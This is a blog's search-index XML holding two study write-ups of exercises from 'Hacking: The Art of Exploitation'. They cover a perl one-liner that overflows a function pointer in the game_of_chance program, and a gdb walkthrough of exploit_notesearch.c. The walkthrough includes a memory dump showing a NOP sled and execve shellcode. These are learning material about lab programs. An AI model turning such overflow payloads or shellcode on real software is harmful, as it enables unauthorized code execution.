<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Hacking: The Art of Exploitation - Overflowing Function Pointers writeup</title>
      <link href="/2018/11/19/Hacking-The-Art-of-Exploitation-Overflowing-Function-Pointers-writeup/"/>
      <url>/2018/11/19/Hacking-The-Art-of-Exploitation-Overflowing-Function-Pointers-writeup/</url>
      
        <content type="html"><![CDATA[<p>The exploit buffer to overflow the function pointer is as follows,</p><p><code>$ perl -e &#39;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x70\x8d\x04\x08\n&quot; . &quot;1\n&quot; . &quot;y\n&quot;x10 . &quot;n\n5\nJon Erickson\n7\n&quot;&#39; |./game_of_chance</code></p><p>The key for this exploit to work is to - <strong>play the same game after changing your user name.</strong></p><p>The exploitation is divided into two phases,</p><ol><li>The first phase is to select a game to play, and change your user name right after.</li></ol><p>The game can be either game 1 or 2 or 3. This sets the <code>last_game</code> which will be compared to the <code>chocie</code> in phase 2.</p><p>They need to be equal to allow the exploitation to work.</p><p>Changing the user name is to overwrite the function poitner <code>current_game</code> with the address of the <code>jackpot()</code> function.</p><ol start="2"><li>In the second phase, when the same game is played, the following code snippet will be skipped, because <code>choice</code> is intentionally made to equal to <code>last_game</code>.</li></ol><p>This makes the execution proceeds to <code>play_the_game</code>. And when <code>player.current_game()</code> is reached, the exeuction will jump to location <code>&quot;\x70\x8d\x04\x08\n&quot;</code>, which is where the <code>jackpot()</code> function is located.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(choice != last_game) &#123; <span class="comment">// If the function ptr isn't set</span></span><br><span class="line">               <span class="keyword">if</span>(choice == <span class="number">1</span>)        <span class="comment">// then point it at the selected game</span></span><br><span class="line">                  player.current_game = pick_a_number;</span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)</span><br><span class="line">                  player.current_game = dealer_no_match;</span><br><span class="line">               <span class="keyword">else</span></span><br><span class="line">                  player.current_game = find_the_ace;</span><br><span class="line">               last_game = choice;   <span class="comment">// and set last_game.</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> binary_exploitation </tag>
            
            <tag> hacking_the_art_of_exploitation </tag>
            
            <tag> c </tag>
            
            <tag> expoit </tag>
            
            <tag> buffer_overflow </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hacking: The Art of Exploitation - exploit_notesearch.c writeup</title>
      <link href="/2018/11/06/Hacking-The-Art-of-Exploitation-Exploit-notesearch-c-writeup/"/>
      <url>/2018/11/06/Hacking-The-Art-of-Exploitation-Exploit-notesearch-c-writeup/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/intere/hacking/blob/master/booksrc/exploit_notesearch.c" target="_blank" rel="noopener">exploit_notesearch source code.c</a></p><p>What the exploit_notesearch.c does, is to allocate an area of memory pointed to by <code>command</code>, to build the exploit command. A proportion of this area is pointed to by <code>buffer</code>, which stores the exploit code.</p><p>When looking at the code of exploit_notesearch.c, the part that confuses me the most is, </p><p><br></p><blockquote><p><strong>How is the offset 270 determined?</strong></p></blockquote><p><br></p><p>After spending enormous hours experimenting, I figured out it is based on the fact that the stack of the <code>notesearch</code> program is residing above the stack of <code>exploit_notesearch</code> program who invokes it.</p><p>That is why varialbe <code>i</code> is used as a reference point to reach to the exploit code exists in the <code>notesearch</code> stack.</p><p>To actually see this behavior ourselves, we can attach to the process of <code>notesearch</code> from gdb, to inspect the data stored in its stack. To do that, we can have a script keep polling the child process of <code>exploit_notesearch</code> program, once the <code>notesearch</code> program is spawned, the script will call gdb to attach to it, and pause its execution for us to explore the data on its stack.</p><p>I will call the script in question <code>gdb-att-childpid.sh</code> (thanks to <a href="https://stackoverflow.com/questions/4382348/is-there-any-way-to-tell-gdb-to-wait-for-a-process-to-start-and-attach-to-it" target="_blank" rel="noopener">this post</a>. Its content is shown below.</p><p>This script will be running in another terminal window. It takes the process name as its input, if our case, is <code>exploit</code>. Once it detects any child process spawned under the given process name, it will start a gdb instance to attach to the child process, and then we have a interactive gdb session to inspect the memory stack of <code>notesearch</code>.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line">progstr=$1</span><br><span class="line">progpid=$(pgrep $progstr)</span><br><span class="line">while [ "$progpid" == "" ]; do</span><br><span class="line">   progpid=$(pgrep $progstr)</span><br><span class="line">done</span><br><span class="line">sudo gdb -p $progpid</span><br></pre></td></tr></table></figure><p>First we start above script in a terminal, then we open a new terminal window to debug the <code>exploit_notesearch</code> program.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q exploit_notesearch</span><br><span class="line">(gdb) run 210</span><br><span class="line">Starting program: /home/myuser/exploit_notesearch 210</span><br></pre></td></tr></table></figure><blockquote><p>We are setting offset to 210 rahter the default 270 here. This value is determined by using the technique (for…seq) illustrated on page 141 of the Hacking: The Art of Exploitation book.</p></blockquote><p>Meanwhile, we notice gdb has automatically attached to the <code>notesearch</code> process in another winodow, and we are given the gdb window to debug from there,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">warning: not using untrusted file &quot;/home/myuser/.gdbinit&quot;</span><br><span class="line">Attaching to process 21537</span><br><span class="line">Reading symbols from /home/myuser/exploit_notesearch/notesearch...done.</span><br><span class="line">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;.</span><br><span class="line">Reading symbols from /lib/tls/i686/cmov/libc.so.6...done.</span><br><span class="line">Loaded symbols for /lib/tls/i686/cmov/libc.so.6</span><br><span class="line">Reading symbols from /lib/ld-linux.so.2...done.</span><br><span class="line">Loaded symbols for /lib/ld-linux.so.2</span><br><span class="line">0xffffe410 in __kernel_vsyscall ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><p>First, let’s see where we are right now,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) where</span><br><span class="line">#0  0xffffe410 in __kernel_vsyscall ()</span><br><span class="line">#1  0xb7f29e40 in nanosleep () from /lib/tls/i686/cmov/libc.so.6</span><br><span class="line">#2  0xb7f29c8f in sleep () from /lib/tls/i686/cmov/libc.so.6</span><br><span class="line">#3  0x0804883b in main (argc=2, argv=0xbffff834) at notesearch.c:20</span><br></pre></td></tr></table></figure><p>The <code>where</code> command shows the backtrace of all the stacks. <code>#0</code> being the current(innvermost) stack, the stack right beneath it is its parent. The output above actually ressembles the order the stack for each function is built in memory - the latest/innermost stack being on the lowest memory address space (on the top of its parent).</p><p>Since we need to inspect the data in <code>notesearch</code>‘s stack, we can use command <code>frame 3</code> to get there.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) frame 3</span><br><span class="line">#3  0x08048792 in main (argc=2, argv=0xbffff7c4) at notesearch.c:16</span><br><span class="line">16         sleep(1);</span><br></pre></td></tr></table></figure><p>We can see the execution is currently paused at line 16 of notesearch.c. This is before the exploit code is put into the <code>searchstring</code> variable. Now let’s contiune the execution to pass the initialization  of the <code>searchstring</code> variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) until 26</span><br><span class="line">main (argc=-1073744190, argv=0xbffff6c2) at notesearch.c:26</span><br></pre></td></tr></table></figure><p>The <code>until</code> command tells the execution to proceed until it reaches line 26 in the notesearch source file.</p><p>Now let’s inspect the data stored in <code>searchstring</code>,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/32xw &amp;searchstring</span><br><span class="line">0xbffff6b0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff6c0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff6d0:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff6e0:     0x90909090      0x90909090      0x90909090      0xdb31c031</span><br><span class="line">0xbffff6f0:     0xb099c931      0x6a80cda4      0x6851580b      0x68732f2f</span><br><span class="line">0xbffff700:     0x69622f68      0x51e3896e      0x8953e289      0xbf80cde1</span><br><span class="line">0xbffff710:     0xbffff6c2      0xbffff6c2      0xbffff6c2      0xbffff6c2</span><br><span class="line">0xbffff720:     0xbffff6c2      0xbffff6c2      0xbffff6c2      0xbffff6c2</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><p>Hurray! The data stored here is exact what we expected, and the return address <code>0xbffff6c2</code> calculated just now sits right in the mid of NOP instructions, which makes the exploitation evetually happen.</p>]]></content>
      
      
      <categories>
          
          <category> cyber_security </category>
          
          <category> binary_exploitation </category>
          
          <category> stack_overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary_exploitation </tag>
            
            <tag> hacking_the_art_of_exploitation </tag>
            
            <tag> c </tag>
            
            <tag> expoit </tag>
            
            <tag> buffer_overflow </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
